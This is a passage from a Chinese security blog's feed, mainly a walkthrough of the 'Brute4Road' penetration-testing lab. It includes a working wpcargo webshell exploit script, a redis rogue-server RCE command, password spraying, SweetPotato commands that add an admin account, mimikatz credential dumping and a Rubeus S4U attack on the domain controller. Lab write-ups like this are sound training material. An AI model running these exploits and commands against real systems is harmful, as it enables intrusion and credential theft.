alt="image-20231004214103299"></p><p>然后设置paylaod</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231004214247968.png" alt="image-20231004214247968"></p><p>然后把这两个设置好  把刚刚生成的exe文件丢到这个内网windows主机里运行就行了  这里怎么访问这个主机呢  得自己设置代理  我就不讲了这里</p><p><strong>这里不用route add xxxxxx其实也可以</strong></p><p>这里的有个别的骚方法就是使用proxychains msfconsole</p><p>这里的话就可以替代这个route add xxxx了</p><p>如果是服务器上没有msf的话 也没关系  我们在kali使用bind_tcp效果是一样的 <strong>(就是替代reverse_tcp)</strong></p><p>这里还有一种方法是使用 <a href="https://github.com/ph4ntonn/Stowaway">Stowaway</a></p><p><strong>使用方法的话我写在这个端口转发那篇这里</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里用这个春秋云镜的Certify靶机举例子&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用这里的前提是先反弹shell到我们的vps上&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;先使用web_delivery这模块来进行监听&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-2</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Potato家族本地提权</title>
    <link href="https://ke1nys.github.io/posts/7a8168b7.html"/>
    <id>https://ke1nys.github.io/posts/7a8168b7.html</id>
    <published>2023-10-03T06:31:23.000Z</published>
    <updated>2023-10-07T14:29:22.115Z</updated>
    
    <content type="html"><![CDATA[<p>占个坑位   来记录一下这个Potato提权</p><p><strong>(这个提权的话主要就是针对这个windows服务账户的提权)</strong></p><p><a href="https://www.freebuf.com/articles/web/256360.html">https://www.freebuf.com/articles/web/256360.html</a>    文章1</p><p><a href="https://xz.aliyun.com/t/7776/">https://xz.aliyun.com/t/7776/</a>  文章2</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;占个坑位   来记录一下这个Potato提权&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;(这个提权的话主要就是针对这个windows服务账户的提权)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/articles/web/256360</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜-Brute4Road</title>
    <link href="https://ke1nys.github.io/posts/989b194c.html"/>
    <id>https://ke1nys.github.io/posts/989b194c.html</id>
    <published>2023-10-02T12:08:19.000Z</published>
    <updated>2023-10-07T14:29:22.120Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><p>fscan开扫 </p><p><img src="../images/image-20231002201316156.png" alt="image-20231002201316156"></p><p>80端口没啥用  就一个centos   然后就是ftp的匿名登录  看了一下也没啥  直接就去看redis这个未授权了</p><p>这里的话创建文件的话是没有权限  所以我们尝试去使用工具来进行反弹shell  <strong>(<a href="https://github.com/n0b0dyCN/redis-rogue-server">主从复制RCE</a>)</strong></p><p><img src="../images/image-20231002202320251.png" alt="image-20231002202320251"></p><blockquote><p>./redis-rogue-server.py —rhost 39.99.136.166 —lhost xx.xx.xxx.xxx</p></blockquote><p>因为这个命令太难看了  所以使用python交互一下</p><p>​    <img src="../images/image-20231002202440595.png" alt="image-20231002202440595"></p><p>想读取flag发现没有权限</p><p><img src="../images/image-20231002202526060.png" alt="image-20231002202526060"></p><p>然后就去尝试提权操作</p><p><strong>还是三个方法挨个试(suid sudo 内核)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm /4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231002202730230.png" alt="image-20231002202730230"></p><p>觉得这个base64很眼熟  于是上网站上找一下</p><p><img src="../images/image-20231002202817191.png" alt="image-20231002202817191"></p><p><img src="../images/image-20231002202908054.png" alt="image-20231002202908054"></p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>先查看内网ip</p><p><img src="../images/image-20231002203044113.png" alt="image-20231002203044113"></p><p>发现没有这个命令  于是上传<a href="https://github.com/cdk-team/CDK">cdk</a>上去执行</p><p><img src="../images/image-20231002204121390.png" alt="image-20231002204121390"></p><p>上传fscan扫描内网</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">172.22.2.3   域控  win</span><br><span class="line"></span><br><span class="line">172.22.2.7   ---&gt; 这是getshell的linux机器</span><br><span class="line"></span><br><span class="line">172.22.2.16  mssqlserver win</span><br><span class="line"></span><br><span class="line">172.22.2.18  web02 ubuntu  wordpress</span><br><span class="line"></span><br><span class="line">172.22.2.34  client01/域内机器</span><br></pre></td></tr></table></figure><p>整理收集到的信息   看到了这个wordpress这个东西   老样子直接拿<code>wpscan</code>老扫</p><p><strong>先去搭建隧道  (还是使用chisel   这里就不多写了)</strong></p><p><img src="../images/image-20231002204926138.png" alt="image-20231002204926138"></p><p>搭建成功  开扫</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">[proxychains] Strict chain  ...  101.42.39.110:7777  ...  172.22.2.18:80  ...  OK</span><br><span class="line">[+] URL: http://172.22.2.18/ [172.22.2.18]</span><br><span class="line">[+] Started: Mon Oct  2 20:50:32 2023</span><br><span class="line"></span><br><span class="line">[proxychains] Strict chain  ...  101.42.39.110:7777  ...  172.22.2.18:80  ...  OK</span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://172.22.2.18/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="line"></span><br><span class="line">[+] WordPress readme found: http://172.22.2.18/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Upload directory has listing enabled: http://172.22.2.18/wp-content/uploads/</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http://172.22.2.18/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 6.0 identified (Insecure, released on 2022-05-24).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http://172.22.2.18/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=6.0&lt;/generator&gt;</span><br><span class="line"> |  - http://172.22.2.18/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.0&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme in use: twentytwentytwo</span><br><span class="line"> | Location: http://172.22.2.18/wp-content/themes/twentytwentytwo/</span><br><span class="line"> | Last Updated: 2023-03-29T00:00:00.000Z</span><br><span class="line"> | Readme: http://172.22.2.18/wp-content/themes/twentytwentytwo/readme.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 1.4</span><br><span class="line"> | Style URL: http://172.22.2.18/wp-content/themes/twentytwentytwo/style.css?ver=1.2</span><br><span class="line"> | Style Name: Twenty Twenty-Two</span><br><span class="line"> | Style URI: https://wordpress.org/themes/twentytwentytwo/</span><br><span class="line"> | Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a...</span><br><span class="line"> | Author: the WordPress team</span><br><span class="line"> | Author URI: https://wordpress.org/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.2 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - http://172.22.2.18/wp-content/themes/twentytwentytwo/style.css?ver=1.2, Match: &#x27;Version: 1.2&#x27;</span><br><span class="line"></span><br><span class="line">[+] Enumerating All Plugins (via Passive Methods)</span><br><span class="line">[+] Checking Plugin Versions (via Passive and Aggressive Methods)</span><br><span class="line"></span><br><span class="line">[i] Plugin(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] wpcargo</span><br><span class="line"> | Location: http://172.22.2.18/wp-content/plugins/wpcargo/</span><br><span class="line"> | Last Updated: 2023-08-26T14:28:00.000Z</span><br><span class="line"> | [!] The version is out of date, the latest version is 6.13.3</span><br><span class="line"> |</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 6.x.x (80% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - http://172.22.2.18/wp-content/plugins/wpcargo/readme.txt</span><br><span class="line"></span><br><span class="line">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="line">[proxychains] Strict chain  ...  101.42.39.110:7777  ...  172.22.2.18:80  ...  OK                                                      &gt; (0 / 137)  0.00%  ETA: ??:??:??</span><br><span class="line">[proxychains] Strict chain  ...  101.42.39.110:7777  ...  172.22.2.18:80  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  101.42.39.110:7777  ...  172.22.2.18:80  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  101.42.39.110:7777  ...  172.22.2.18:80  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  101.42.39.110:7777  ...  172.22.2.18:80  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  101.42.39.110:7777  ...  172.22.2.18:80  ...  OK                                                     &gt; (19 / 137) 13.86%  ETA: 00:00:05</span><br><span class="line">[proxychains] Strict chain  ...  101.42.39.110:7777  ...  172.22.2.18:80  ...  OK                                                     &gt; (40 / 137) 29.19%  ETA: 00:00:03</span><br><span class="line"> Checking Config Backups - Time: 00:00:02 &lt;=========================================================================================&gt; (137 / 137) 100.00% Time: 00:00:02</span><br><span class="line"></span><br><span class="line">[i] No Config Backups Found.</span><br><span class="line"></span><br><span class="line">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="line"></span><br><span class="line">[+] Finished: Mon Oct  2 20:50:48 2023</span><br><span class="line">[+] Requests Done: 172</span><br><span class="line">[+] Cached Requests: 5</span><br><span class="line">[+] Data Sent: 42.632 KB</span><br><span class="line">[+] Data Received: 250.835 KB</span><br><span class="line">[+] Memory used: 263.754 MB</span><br><span class="line">[+] Elapsed time: 00:00:16</span><br></pre></td></tr></table></figure><p>wordpress 一般都是先从插件入手, 实在不行了再去爆破用户名密码</p><p>wpcargo 插件存在未授权 RCE, exp 如下</p><p><a href="https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a">https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import binascii</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"># This is a magic string that when treated as pixels and compressed using the png</span><br><span class="line"># algorithm, will cause &lt;?=$_GET[1]($_POST[2]);?&gt; to be written to the png file</span><br><span class="line">payload = &#x27;2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50&#x27;</span><br><span class="line"></span><br><span class="line">def encode_character_code(c: int):</span><br><span class="line">    return &#x27;&#123;:08b&#125;&#x27;.format(c).replace(&#x27;0&#x27;, &#x27;x&#x27;)</span><br><span class="line"></span><br><span class="line">text = &#x27;&#x27;.join([encode_character_code(c) for c in binascii.unhexlify(payload)])[1:]</span><br><span class="line"></span><br><span class="line">destination_url = &#x27;http://172.22.2.18/&#x27;</span><br><span class="line">cmd = &#x27;id&#x27;</span><br><span class="line"></span><br><span class="line"># With 1/11 scale, &#x27;1&#x27;s will be encoded as single white pixels, &#x27;x&#x27;s as single black pixels.</span><br><span class="line">requests.get(</span><br><span class="line">    f&quot;&#123;destination_url&#125;wp-content/plugins/wpcargo/includes/barcode.php?text=&#123;text&#125;&amp;sizefactor=.090909090909&amp;size=1&amp;filepath=/var/www/html/webshell.php&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># We have uploaded a webshell - now let&#x27;s use it to execute a command.</span><br><span class="line">print(requests.post(</span><br><span class="line">    f&quot;&#123;destination_url&#125;webshell.php?1=system&quot;, data=&#123;&quot;2&quot;: cmd&#125;</span><br><span class="line">).content.decode(&#x27;ascii&#x27;, &#x27;ignore&#x27;))</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231002205425378.png" alt="image-20231002205425378"></p><p>这里记得写马进去  才去连接</p><p><img src="../images/image-20231002210235208.png" alt="image-20231002210235208"></p><p>蚁剑尝试进行连接</p><p><img src="../images/image-20231002210153422.png" alt="image-20231002210153422"></p><p><code>ps -aux</code>  的话发现运行了smb这个服务  但是这里感觉没啥用  就去查看配置文件</p><p><img src="../images/image-20231002210316560.png" alt="image-20231002210316560"></p><p>查看wordpress的配置文件发现了这个数据账号密码</p><p><code>netstat -anl</code>进行查看</p><p><img src="../images/image-20231002210655743.png" alt="image-20231002210655743"></p><p>发现只有本地用户才能访问这个数据库  那么就得在挂一层代理了  但是这里的话我们使用<code>adminer.php</code>这个方法</p><p>下载下来上传到<code>html</code>这个目录下</p><p><img src="../images/image-20231002211020823.png" alt="image-20231002211020823"></p><p>然后直接去访问</p><p>登录成功后  切换数据库</p><p><img src="../images/image-20231002211136394.png" alt="image-20231002211136394"></p><p><img src="../images/image-20231002211232987.png" alt="image-20231002211232987"></p><p>找到第二个flag  然后第二表的名字很有意思</p><p><img src="../images/image-20231002211333708.png" alt="image-20231002211333708"></p><p>列名是密码  那么我们导出全部数据</p><p>然后复制内容到这个1.txt中</p><p>使用python脚本将密码给提取出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">filename = &quot;1.txt&quot;</span><br><span class="line">output_filename = &quot;pass.txt&quot;</span><br><span class="line"></span><br><span class="line"># 从文件中读取数据</span><br><span class="line">with open(filename, &quot;r&quot;) as file:</span><br><span class="line">    data = file.readlines()</span><br><span class="line"></span><br><span class="line"># 使用正则表达式提取字符串</span><br><span class="line">pattern = r&quot;&#x27;(.*?)&#x27;&quot;</span><br><span class="line">strings = [re.findall(pattern, item)[0] for item in data]</span><br><span class="line"></span><br><span class="line"># 将结果输出到文件</span><br><span class="line">with open(output_filename, &quot;w&quot;) as file:</span><br><span class="line">    for string in strings:</span><br><span class="line">        file.write(string + &quot;\n&quot;)</span><br></pre></td></tr></table></figure><p>结合我们刚开始收集到的信息   172.22.2.16这个ip使用windwos主机来当服务器来设置了mssql  并且开启了1433端口  并且我们前面还收集到了 这smb这个服务  于是我们使用上面获取的密码进行爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./fscan_amd64  -h 172.22.2.0/24 -m smb -pwdf pass.txt</span><br><span class="line">./fscan_amd64  -h 172.22.2.0/24 -m mssql -pwdf pass.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">./fscan_amd64  -h 172.22.2.0/24 -m smb -pwdf pass.txt</span><br><span class="line"></span><br><span class="line">___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.2</span><br><span class="line">-m  smb  start scan the port: 445</span><br><span class="line">start infoscan</span><br><span class="line">trying RunIcmp2</span><br><span class="line">The current user permissions unable to send icmp packets</span><br><span class="line">start ping</span><br><span class="line">(icmp) Target 172.22.2.3      is alive</span><br><span class="line">(icmp) Target 172.22.2.7      is alive</span><br><span class="line">(icmp) Target 172.22.2.16     is alive</span><br><span class="line">(icmp) Target 172.22.2.18     is alive</span><br><span class="line">(icmp) Target 172.22.2.34     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 5</span><br><span class="line">172.22.2.3:445 open</span><br><span class="line">172.22.2.34:445 open</span><br><span class="line">172.22.2.16:445 open</span><br><span class="line">172.22.2.18:445 open</span><br><span class="line">[*] alive ports len is: 4</span><br><span class="line">start vulscan</span><br><span class="line">[+] SMB:172.22.2.18:445:administrator pAssw0rd</span><br><span class="line">[+] SMB:172.22.2.16:445:admin pAssw0rd</span><br><span class="line">已完成 4/4</span><br></pre></td></tr></table></figure><p>扫描完这个smb的话  登录上去发现没啥用<strong>(是空的)</strong>   于是尝试去扫这个 <code>mssql</code>服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">./fscan_amd64  -h 172.22.2.0/24 -m mssql -pwdf pass.txt</span><br><span class="line"></span><br><span class="line">/ _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.2</span><br><span class="line">-m  mssql  start scan the port: 1433</span><br><span class="line">start infoscan</span><br><span class="line">trying RunIcmp2</span><br><span class="line">The current user permissions unable to send icmp packets</span><br><span class="line">start ping</span><br><span class="line">(icmp) Target 172.22.2.16     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 1</span><br><span class="line">172.22.2.16:1433 open</span><br><span class="line">[*] alive ports len is: 1</span><br><span class="line">start vulscan</span><br><span class="line">[+] mssql:172.22.2.16:1433:sa  ElGNkOiC</span><br><span class="line">已完成 1/1</span><br></pre></td></tr></table></figure><p>爆破出了这个172.22.2.16的服务器账号密码</p><p>于是尝试进行登录</p><p><strong>(这里使用的这个工具叫做MUDT)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; &#x27;C:\Program Files\Java\jdk1.8.0_202\bin\java.exe&#x27; -jar .\Multiple.Database.Utilization.Tools-2.1.1-jar-with-dependencies.jar</span><br></pre></td></tr></table></figure><p>这里使用这个命令进行登录</p><p><img src="../images/image-20231002212509325.png" alt="image-20231002212509325"></p><p><img src="../images/image-20231002212533573.png" alt="image-20231002212533573"></p><p>成功连接该数据库 </p><p> 这里找遍了目录发现没有flag  于是猜测藏在这个Administrator用户里  于是尝试进行提权操作</p><p>这里的话尝试<code>SweetPotato.exe</code>来进行提权————-(<strong>刚开始写的时候有点懵  这里补充写一下为什么使用这个提权的原因</strong>)</p><blockquote><ul><li>第一点 </li></ul><p>就是我们这里登录是服务账户  并且是windows系统  (但这里并不能完全确认使用Potato这个工具)</p><ul><li>第二点</li></ul><p>就是我们使用了whoami /priv发现其开启了SeImpersonatePrivilege这个权限</p></blockquote><p><img src="../images/image-20231003144203530.png" alt="image-20231003144203530"></p><p><strong>(直接拿别人的图了  就不上靶机上重新演示了)</strong></p><blockquote><ul><li>以上两点刚好满足了我们使用potato的这个条件  于是这里我们就可以使用potato这个工具了</li></ul></blockquote><p><strong>以下是提权过程·</strong></p><ul><li>第一步</li></ul><p><img src="../images/image-20231002213023315.png" alt="image-20231002213023315"></p><ul><li>第二步</li></ul><p>上传<code>SweetPotato.exe</code>工具</p><p><img src="../images/image-20231002213209802.png" alt="image-20231002213209802"></p><ul><li>开始提权</li></ul><p><img src="../images/image-20231002213258829.png" alt="image-20231002213258829"></p><p>拿下管理员权限</p><p>因为不知道flag藏在哪  文件名也不知道  <strong>使用dir命令没有反应…….</strong></p><p><img src="../images/image-20231002213757844.png" alt="image-20231002213757844"></p><p>发现3389端口开着呢  于是我们使用管理员权限给本机添加个账号  并且加入本地管理员组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/Public/SweetPotato.exe -a &quot;net user Ke1nys qwer1234! /add&quot;</span><br><span class="line">C:/Users/Public/SweetPotato.exe -a &quot;net localgroup administrators Ke1nys /add&quot;</span><br></pre></td></tr></table></figure><p>RDP进行连接</p><p><img src="../images/image-20231002214041936.png" alt="image-20231002214041936"></p><p>直接去访问这个<code>Administrator</code>用户</p><p><img src="../images/image-20231002214127329.png" alt="image-20231002214127329"></p><p>拿到第三个flag  </p><p>最后的话肯定是拿域控了</p><p>因为我们现在是本地管理员   可以有权限读取本地hash值  于是我们传入mimikatz进行读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure><p>这里记得要以管理员的身份运行  否则会报错  </p><p><img src="../images/image-20231002214840666.png" alt="image-20231002214840666"></p><p>一个一个翻，可以翻到<code>MSSQLSERVER$</code>这个用户，MSSQLSERVER 配置了到域控的约束委派, 可以通过 S4U 伪造高权限 ST 拿下域控，并且似乎只有他的NTLM哈希可用，我们用Rubeus申请访问自身的服务票据</p><p><strong>(这里的话不使用bloodhound的原因就是我们新创建的用户只是本地管理员用户  并不是域用户  所以不能使用bloodhound这个东西来获取域内环境的联系)</strong></p><p>这里的话是使用<code>Rubeus</code>这个工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:f05a1195c832a5d5bf080c8bed5ac227 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231002215710933.png" alt="image-20231002215710933"></p><p><strong>抓到后伪造这个域管用户的ST  然后注入票据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:你上面抓到的服务票据</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231002215954416.png" alt="image-20231002215954416"></p><p>成功注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type \\DC.xiaorang.lab\C$\Users\Administrator\flag\flag04.txt</span><br></pre></td></tr></table></figure><p>读取flag</p><p><img src="../images/image-20231002220136592.png" alt="image-20231002220136592"></p><p>这里的话其实使用kekeo这工具也行其实</p><p><strong>偷张图  不知道他咋整的</strong></p><p><img src="../images/image-20231002223239748.png" alt="image-20231002223239748"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h2&gt;&lt;h2 id=&quot;外网打点&quot;&gt;&lt;a href=&quot;#外网打点&quot; class=&quot;headerlink&quot; title=&quot;外网打点&quot;&gt;&lt;/a</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜-Certify</title>
    <link href="https://ke1nys.github.io/posts/c964b814.html"/>
    <id>https://ke1nys.github.io/posts/c964b814.html</id>
    <published>2023-09-29T08:36:18.000Z</published>
    <updated>2023-10-07T14:29:22.121Z</updated>
    
